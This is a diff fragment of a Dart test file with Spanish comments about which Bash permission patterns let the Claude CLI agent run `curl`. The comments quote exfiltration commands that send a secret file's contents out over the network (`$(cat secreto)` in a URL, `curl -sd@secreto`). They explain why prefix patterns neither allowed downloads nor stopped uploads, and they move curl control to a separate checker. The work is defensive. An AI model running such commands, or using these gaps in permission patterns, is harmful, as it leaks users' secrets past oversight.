@@ -39,16 +39,11 @@ void main() {
     });
   });
 
-  group('descargar viene de serie', () {
-    // **Se escribió estrecho y estaba mal por los dos lados.** `Bash(curl -o:*)`
-    // no servía —Claude escribe `curl -sSL <url> -o destino`, con los flags
-    // delante, así que la descarga se bloqueaba igual— y tampoco protegía:
-    // `curl -o x "https://…/?d=$(cat secreto)"` empieza por `curl -o`. Medido
-    // lanzándolo contra el binario las dos veces.
-    test('curl entero, porque el prefijo no era ni útil ni seguro', () {
-      expect(AllowedCommands.paraDescargar, 'Bash(curl:*)');
-    });
-
+  group('lo que sube se niega', () {
+    // 🔴 `curl` ya **no** se concede por patrón: con el permiso ancho el CLI no
+    // preguntaba, y ningún patrón lee `curl -sd@secreto`. La frontera está en
+    // Nexus, que lee el comando entero —ver `lo_que_sube_un_curl_test.dart`—,
+    // y estos patrones quedan como segunda capa.
     // La frontera de verdad. Y es una frontera real, no un gesto: en una
     // carpeta que puede escribir la salida a la red ya estaba abierta por
     // `WebFetch`, así que lo que `curl` añade es poder **subir** un archivo —y
